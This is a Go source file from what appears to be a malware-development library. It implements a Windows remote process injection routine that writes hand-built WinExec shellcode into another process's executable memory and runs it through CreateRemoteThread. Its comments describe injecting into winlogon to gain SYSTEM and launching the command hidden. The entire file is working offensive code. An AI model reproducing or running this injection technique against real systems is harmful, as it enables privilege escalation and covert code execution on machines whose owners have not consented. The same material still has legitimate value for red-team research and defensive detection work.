//go:build windows

package inject

import (
	"fmt"
	"strings"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// RemoteExec injects a WinExec shellcode stub into a remote process and
// creates a thread to execute the specified command line.
//
// This is useful when CreateProcessWithTokenW is unavailable (e.g., after
// token corruption) — it injects directly into a process that already has
// the desired security context (e.g., winlogon for SYSTEM).
//
// Since ASLR randomizes DLL base addresses per-boot (not per-process),
// the kernel32!WinExec address resolved locally is valid in the target.
//
// hProcess must have PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
// PROCESS_CREATE_THREAD access.
// hidden=true launches the process with SW_HIDE (no visible window).
// waitMs is the timeout in milliseconds to wait for the remote thread
// (0 = no wait, 5000 is typical).
func RemoteExec(hProcess windows.Handle, exePath string, args []string, hidden bool, waitMs uint32) error {
	parts := make([]string, 0, 1+len(args))
	parts = append(parts, exePath)
	parts = append(parts, args...)
	cmdLine := strings.Join(parts, " ")
	cmdBytes := append([]byte(cmdLine), 0) // null-terminated ASCII for WinExec

	// Resolve WinExec address in kernel32.dll.
	procWinExec := api.Kernel32.NewProc("WinExec")
	if err := procWinExec.Find(); err != nil {
		return fmt.Errorf("resolve WinExec: %w", err)
	}
	winExecAddr := procWinExec.Addr()

	// Build x64 shellcode: sub rsp,0x28; mov edx,uCmdShow; mov rax,<WinExec>; call rax; add rsp,0x28; ret
	uCmdShow := byte(1) // SW_SHOWNORMAL
	if hidden {
		uCmdShow = 0 // SW_HIDE
	}
	shellcode := []byte{
		0x48, 0x83, 0xEC, 0x28,                   // sub rsp, 0x28
		0xBA, uCmdShow, 0x00, 0x00, 0x00,         // mov edx, uCmdShow
		0x48, 0xB8,                                // mov rax, imm64 ...
	}
	for i := 0; i < 8; i++ {
		shellcode = append(shellcode, byte(winExecAddr>>(i*8)))
	}
	shellcode = append(shellcode,
		0xFF, 0xD0,             // call rax
		0x48, 0x83, 0xC4, 0x28, // add rsp, 0x28
		0xC3,                   // ret
	)

	// Pad to 32-byte boundary, then append command string.
	const cmdOffset = 32
	for len(shellcode) < cmdOffset {
		shellcode = append(shellcode, 0x90) // NOP
	}
	payload := append(shellcode, cmdBytes...)

	// Allocate executable memory in target process.
	remoteBuf, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(hProcess), 0, uintptr(len(payload)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if remoteBuf == 0 {
		return fmt.Errorf("VirtualAllocEx: %w", err)
	}

	// Write payload into remote process.
	if err := windows.WriteProcessMemory(hProcess, remoteBuf, &payload[0], uintptr(len(payload)), nil); err != nil {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// Create remote thread: shellcode at remoteBuf, parameter = command string.
	threadHandle, _, err := api.ProcCreateRemoteThread.Call(
		uintptr(hProcess), 0, 0,
		remoteBuf,           // lpStartAddress
		remoteBuf+cmdOffset, // lpParameter (command string)
		0, 0,
	)
	if threadHandle == 0 {
		return fmt.Errorf("CreateRemoteThread: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(threadHandle))

	if waitMs > 0 {
		windows.WaitForSingleObject(windows.Handle(threadHandle), waitMs)
	}
	return nil
}
